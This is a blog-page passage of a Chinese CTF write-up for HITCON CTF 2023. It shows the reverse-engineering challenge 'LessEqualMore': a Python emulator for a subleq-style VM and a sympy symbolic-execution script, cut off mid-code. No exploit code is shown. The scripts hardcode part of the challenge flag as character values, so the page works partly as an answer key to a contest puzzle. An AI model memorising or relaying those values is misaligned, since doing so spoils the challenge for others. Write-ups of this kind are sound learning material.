<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HITCONCTF-2023 | Photon’s Blog</title><meta name="keywords" content="pwn,wp,ctf,re"><meta name="author" content="Photon"><meta name="copyright" content="Photon"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="蛤蛤，有蠢比做qemu逃逸没看见-sandbox on，做了半天以为调通了结果发现爆了bad syscall 。唐完了(我有抑郁症)  军训完的第一个周末，终于有时间看比赛了，不过因为过于菜没啥输出的。一共看了一个re一个pwn题，出了个re。pwn题花了挺长时间的，最后一天晚上被大大卷拉去聚餐了(回去之后还没做出来，没看见有沙盒)。不过还是第一次正式比赛做qemu逃逸的题，也没接触过这种有沙盒">
<meta property="og:type" content="article">
<meta property="og:title" content="HITCONCTF-2023">
<meta property="og:url" content="http://phot0n.com/2023/09/11/HITCONCTF-2023/index.html">
<meta property="og:site_name" content="Photon’s Blog">
<meta property="og:description" content="蛤蛤，有蠢比做qemu逃逸没看见-sandbox on，做了半天以为调通了结果发现爆了bad syscall 。唐完了(我有抑郁症)  军训完的第一个周末，终于有时间看比赛了，不过因为过于菜没啥输出的。一共看了一个re一个pwn题，出了个re。pwn题花了挺长时间的，最后一天晚上被大大卷拉去聚餐了(回去之后还没做出来，没看见有沙盒)。不过还是第一次正式比赛做qemu逃逸的题，也没接触过这种有沙盒">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg">
<meta property="article:published_time" content="2023-09-11T04:39:49.000Z">
<meta property="article:modified_time" content="2023-09-13T12:44:02.085Z">
<meta property="article:author" content="Photon">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="wp">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="re">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg"><link rel="shortcut icon" href="/img/20170202211516_4B3nj.thumb.1000_0.jpeg"><link rel="canonical" href="http://phot0n.com/2023/09/11/HITCONCTF-2023/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'HITCONCTF-2023',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-09-13 20:44:02'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"> <script src="/live2d-widget/autoload.js"></script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Photon’s Blog" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2022/01/19/K4TwFgDxsJ62tEo.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">62</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">41</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Photon’s Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HITCONCTF-2023</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-09-11T04:39:49.000Z" title="Created 2023-09-11 12:39:49">2023-09-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-09-13T12:44:02.085Z" title="Updated 2023-09-13 20:44:02">2023-09-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">6.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>37min</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>蛤蛤，有蠢比做qemu逃逸没看见<code>-sandbox on</code>，做了半天以为调通了结果发现爆了<code>bad syscall</code> 。唐完了(我有抑郁症)</p>
</blockquote>
<p>军训完的第一个周末，终于有时间看比赛了，不过因为过于菜没啥输出的。一共看了一个re一个pwn题，出了个re。pwn题花了挺长时间的，最后一天晚上被大大卷拉去聚餐了(回去之后还没做出来，没看见有沙盒)。不过还是第一次正式比赛做qemu逃逸的题，也没接触过这种有沙盒的qemu逃逸题(不过想法是差不多的)。调试也挺花时间的，每次打包文件系统都要花好长时间，而且也是第一次用docker进行调试，不太熟。不过收获还是很大的。</p>
<p>赛后把pwn的题复现一下，主要是那三个吧。qemu逃逸，kernel pwn，还有用户态利用。哦对还有re的延申pwn题。Kernel在比赛中没啥时间打，打算自己不看wp做做看，好像也不是很难的样子</p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="LessEqualMore"><a href="#LessEqualMore" class="headerlink" title="LessEqualMore"></a>LessEqualMore</h2><p>可以写出等价python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">&quot;chal.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">code = f.read().split()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(code)):</span><br><span class="line">    code[i] = int(code[i])</span><br><span class="line">    <span class="comment"># if(code[i] in success):</span></span><br><span class="line">    <span class="comment">#     print(i)</span></span><br><span class="line"></span><br><span class="line">RIP = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bignum</span>():</span></span><br><span class="line">    <span class="keyword">return</span> -int(input())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">op1</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(a&lt;<span class="number">0</span>):</span><br><span class="line">        bignum = get_bignum()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bignum = code[a]</span><br><span class="line">    <span class="keyword">if</span>(b&lt;<span class="number">0</span>):</span><br><span class="line">        print(chr(bignum),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        code[b] -=bignum</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ans = []</span><br><span class="line">k = []</span><br><span class="line"></span><br><span class="line">code_2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">    code_2.append(i)</span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(RIP&gt;=<span class="number">0</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># print(&quot;================&quot;)</span></span><br><span class="line">        <span class="comment"># print(f&quot;RIP = &#123;RIP&#125;&quot;)</span></span><br><span class="line">        <span class="comment"># print(f&quot;code[&#123;code[RIP+1]&#125;]-code[&#123;code[RIP]&#125;] = &#123;code[code[RIP+1]]&#125; - &#123;code[code[RIP]]&#125;&quot;)</span></span><br><span class="line">        <span class="comment"># print(f&quot;code[&#123;RIP+2&#125;] = &#123;code[RIP+2]&#125;&quot;)</span></span><br><span class="line">        <span class="comment"># if(code[RIP+2] != RIP+3 and code[RIP+1] != code[RIP]):</span></span><br><span class="line">        <span class="comment">#     print(&quot;may judge&quot;)</span></span><br><span class="line">        <span class="comment"># for i in range(3):</span></span><br><span class="line">        <span class="comment">#     print(f&quot;code[&#123;RIP+i&#125;] = &#123;code[RIP+i]&#125;&quot;)</span></span><br><span class="line">        <span class="comment"># if(code[code[RIP]] &gt;=33 and code[code[RIP]]&lt;=125):</span></span><br><span class="line">        <span class="comment">#     ans.append(code[code[RIP]])</span></span><br><span class="line">            <span class="comment"># k.append(RIP)</span></span><br><span class="line">            <span class="comment"># print(chr(code[code[RIP]]))</span></span><br><span class="line">        <span class="keyword">if</span>(RIP==<span class="number">5436</span>):</span><br><span class="line">            <span class="keyword">if</span>(flag==<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span>(flag !=<span class="number">2</span>):</span><br><span class="line">                flag+=<span class="number">1</span>    </span><br><span class="line">        op1(code[RIP],code[RIP+<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span>(code[code[RIP+<span class="number">1</span>]]&lt;=<span class="number">0</span>):</span><br><span class="line">            RIP = code[RIP+<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            RIP += <span class="number">3</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">&quot;-1 to exit, -2 to continue,else to show code&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">            op = int(input())</span><br><span class="line">            <span class="keyword">if</span>(op==<span class="number">-1</span>):</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">elif</span>(op==<span class="number">-2</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span>(op==<span class="number">-3</span>):</span><br><span class="line">                RIP = int(input())</span><br><span class="line">            <span class="keyword">elif</span>(op==<span class="number">-4</span>):</span><br><span class="line">                print(xret(int(input())))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">                    print(<span class="string">f&quot;code[<span class="subst">&#123;op+i&#125;</span>] = <span class="subst">&#123;code[op+i]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># f = open(&quot;cd.txt&quot;,&quot;r+&quot;)</span></span><br><span class="line"><span class="comment"># f.write(str(code))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(len(code)):</span></span><br><span class="line"><span class="comment">#     if(code[i] != code_2[i]):</span></span><br><span class="line"><span class="comment">#         print(f&quot;&#123;i&#125;,&#123;code_2[i]&#125;,&#123;code[i]&#125;&quot;)</span></span><br></pre></td></tr></table></figure>
<p>通过调试可以知道，code[19]-code[79]这部分是存我们输入的flag的，RIP=5436开始对输入进行校验。</p>
<p>所以我们可以把RIP=5436这个点的code给dump出来，然后符号化code[19]-code[79]，从RIP=5436开始运行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy <span class="keyword">as</span> sm</span><br><span class="line">f = open(<span class="string">&quot;cd.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">code = eval(f.read())</span><br><span class="line"><span class="comment"># print(cd)</span></span><br><span class="line">print(code[<span class="number">7</span>])</span><br><span class="line">length = <span class="number">64</span></span><br><span class="line">code[<span class="number">4</span>] = length</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">4375</span>,<span class="number">4376</span>,<span class="number">4394</span>]:</span><br><span class="line">    code[i] = <span class="number">16</span>+length<span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">4561</span>,<span class="number">4562</span>,<span class="number">4580</span>]:</span><br><span class="line">    code[i] = <span class="number">16</span>+length</span><br><span class="line"><span class="comment"># s = &quot;&quot;</span></span><br><span class="line"><span class="comment"># for i in range(length):</span></span><br><span class="line"><span class="comment">#     s+=f&quot;x&#123;i&#125;, &quot;</span></span><br><span class="line"><span class="comment"># s = s[:-2]</span></span><br><span class="line"><span class="comment"># s+= f&quot; = sm.symbols(&#x27;x0:&#123;length&#125;&#x27;)&quot;</span></span><br><span class="line"><span class="comment"># eval(s)</span></span><br><span class="line"><span class="comment"># print(x0)</span></span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line">x0, x1, x2, x3, x4, x5, x6, x7, x8, x9, x10, x11, x12, x13, x14, x15, x16, x17, x18, x19, x20, x21, x22, x23, x24, x25, x26, x27, x28, x29, x30, x31, x32, x33, x34, x35, x36, x37, x38, x39, x40, x41, x42, x43, x44, x45, x46, x47, x48, x49, x50, x51, x52, x53, x54, x55, x56, x57, x58, x59, x60, x61, x62, x63 = sm.symbols(<span class="string">&#x27;x0:64&#x27;</span>,integer=<span class="literal">True</span>,positive=<span class="literal">True</span>,domain=sm.Interval(<span class="number">0</span>, <span class="number">256</span>))</span><br><span class="line"><span class="comment"># for i in range(length):</span></span><br><span class="line"><span class="comment">#     print(f&quot;code[&#123;16+i&#125;] =x&#123;i&#125;&quot;) </span></span><br><span class="line">code[<span class="number">16</span>] =<span class="number">104</span></span><br><span class="line">code[<span class="number">17</span>] =<span class="number">105</span></span><br><span class="line">code[<span class="number">18</span>] =<span class="number">116</span></span><br><span class="line">code[<span class="number">19</span>] =<span class="number">99</span></span><br><span class="line">code[<span class="number">20</span>] =<span class="number">111</span></span><br><span class="line">code[<span class="number">21</span>] =<span class="number">110</span></span><br><span class="line">code[<span class="number">22</span>] =<span class="number">123</span></span><br><span class="line">code[<span class="number">23</span>] =<span class="number">114</span></span><br><span class="line"><span class="comment"># code[16] =x0</span></span><br><span class="line"><span class="comment"># code[17] =x1</span></span><br><span class="line"><span class="comment"># code[18] =x2</span></span><br><span class="line"><span class="comment"># code[19] =x3</span></span><br><span class="line"><span class="comment"># code[20] =x4</span></span><br><span class="line"><span class="comment"># code[21] =x5</span></span><br><span class="line"><span class="comment"># code[22] =x6</span></span><br><span class="line"><span class="comment"># code[23] =x7</span></span><br><span class="line"><span class="comment"># code[24] =51</span></span><br><span class="line"><span class="comment"># code[25] =118</span></span><br><span class="line"><span class="comment"># code[26] =69</span></span><br><span class="line"><span class="comment"># code[27] =114</span></span><br><span class="line"><span class="comment"># code[28] =115</span></span><br><span class="line"><span class="comment"># code[29] =49</span></span><br><span class="line"><span class="comment"># code[30] =110</span></span><br><span class="line"><span class="comment"># code[31] =103</span></span><br><span class="line">code[<span class="number">24</span>] =x8</span><br><span class="line">code[<span class="number">25</span>] =x9</span><br><span class="line">code[<span class="number">26</span>] =x10</span><br><span class="line">code[<span class="number">27</span>] =x11</span><br><span class="line">code[<span class="number">28</span>] =x12</span><br><span class="line">code[<span class="number">29</span>] =x13</span><br><span class="line">code[<span class="number">30</span>] =x14</span><br><span class="line">code[<span class="number">31</span>] =x15</span><br><span class="line">code[<span class="number">32</span>] =x16</span><br><span class="line">code[<span class="number">33</span>] =x17</span><br><span class="line">code[<span class="number">34</span>] =x18</span><br><span class="line">code[<span class="number">35</span>] =x19</span><br><span class="line">code[<span class="number">36</span>] =x20</span><br><span class="line">code[<span class="number">37</span>] =x21</span><br><span class="line">code[<span class="number">38</span>] =x22</span><br><span class="line">code[<span class="number">39</span>] =x23</span><br><span class="line">code[<span class="number">40</span>] =x24</span><br><span class="line">code[<span class="number">41</span>] =x25</span><br><span class="line">code[<span class="number">42</span>] =x26</span><br><span class="line">code[<span class="number">43</span>] =x27</span><br><span class="line">code[<span class="number">44</span>] =x28</span><br><span class="line">code[<span class="number">45</span>] =x29</span><br><span class="line">code[<span class="number">46</span>] =x30</span><br><span class="line">code[<span class="number">47</span>] =x31</span><br><span class="line">code[<span class="number">48</span>] =x32</span><br><span class="line">code[<span class="number">49</span>] =x33</span><br><span class="line">code[<span class="number">50</span>] =x34</span><br><span class="line">code[<span class="number">51</span>] =x35</span><br><span class="line">code[<span class="number">52</span>] =x36</span><br><span class="line">code[<span class="number">53</span>] =x37</span><br><span class="line">code[<span class="number">54</span>] =x38</span><br><span class="line">code[<span class="number">55</span>] =x39</span><br><span class="line">code[<span class="number">56</span>] =x40</span><br><span class="line">code[<span class="number">57</span>] =x41</span><br><span class="line">code[<span class="number">58</span>] =x42</span><br><span class="line">code[<span class="number">59</span>] =x43</span><br><span class="line">code[<span class="number">60</span>] =x44</span><br><span class="line">code[<span class="number">61</span>] =x45</span><br><span class="line">code[<span class="number">62</span>] =x46</span><br><span class="line">code[<span class="number">63</span>] =x47</span><br><span class="line">code[<span class="number">64</span>] =x48</span><br><span class="line">code[<span class="number">65</span>] =x49</span><br><span class="line">code[<span class="number">66</span>] =x50</span><br><span class="line">code[<span class="number">67</span>] =x51</span><br><span class="line">code[<span class="number">68</span>] =x52</span><br><span class="line">code[<span class="number">69</span>] =x53</span><br><span class="line">code[<span class="number">70</span>] =x54</span><br><span class="line">code[<span class="number">71</span>] =x55</span><br><span class="line">code[<span class="number">72</span>] =x56</span><br><span class="line">code[<span class="number">73</span>] =x57</span><br><span class="line">code[<span class="number">74</span>] =x58</span><br><span class="line">code[<span class="number">75</span>] =x59</span><br><span class="line">code[<span class="number">76</span>] =x60</span><br><span class="line">code[<span class="number">77</span>] =x61</span><br><span class="line">code[<span class="number">78</span>] =x62</span><br><span class="line">code[<span class="number">79</span>] =x63</span><br><span class="line"></span><br><span class="line">indx = <span class="number">0</span></span><br><span class="line"><span class="comment"># for i in range(255):</span></span><br><span class="line"><span class="comment">#     print(code[1040+i])</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">op1</span>(<span class="params">a,b,indx</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(type(a)==sm.core.add.Add):</span><br><span class="line">        varname = <span class="string">f&quot;y<span class="subst">&#123;indx&#125;</span>&quot;</span></span><br><span class="line">        vars()[varname] = sm.symbols(varname,integer=<span class="literal">True</span>,positive=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># exec(f&quot;y&#123;y&#125; = sm.symbols(&#x27;y&#123;y&#125;&#x27;)&quot;)</span></span><br><span class="line">        <span class="comment"># exec(f&quot;bignum=y&#123;y&#125;&quot;)</span></span><br><span class="line">        bignum = vars()[varname]</span><br><span class="line">        indx+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span>(a&lt;<span class="number">0</span>):</span><br><span class="line">            bignum = get_bignum()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            bignum = code[a]</span><br><span class="line">    <span class="keyword">if</span>(b&lt;<span class="number">0</span>):</span><br><span class="line">        print(chr(bignum),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        code[b] -=bignum</span><br><span class="line">        code[b] = sm.sympify(code[b])</span><br><span class="line">RIP = <span class="number">5436</span></span><br><span class="line">indx = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(RIP&gt;=<span class="number">0</span>):</span><br><span class="line">    op1(code[RIP],code[RIP+<span class="number">1</span>],indx)</span><br><span class="line">    bore = code[code[RIP+<span class="number">1</span>]] &lt;=<span class="number">0</span></span><br><span class="line">    <span class="comment"># print(type(bore))</span></span><br><span class="line">    <span class="keyword">if</span>(type(bore)==sm.core.relational.LessThan):</span><br><span class="line">        ans_max_set = &#123;&#125;</span><br><span class="line">        ans_min_set = &#123;&#125;</span><br><span class="line">        sym = bore.free_symbols</span><br><span class="line">        <span class="keyword">while</span>(sym != set()):</span><br><span class="line">            tmp = sym.pop()</span><br><span class="line">            ans_max_set[tmp]=<span class="number">256</span></span><br><span class="line">            ans_min_set[tmp]=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(bore.subs(ans_max_set)  <span class="keyword">or</span> bore.subs(ans_min_set) ):</span><br><span class="line">            RIP = code[RIP+<span class="number">2</span>]</span><br><span class="line">        <span 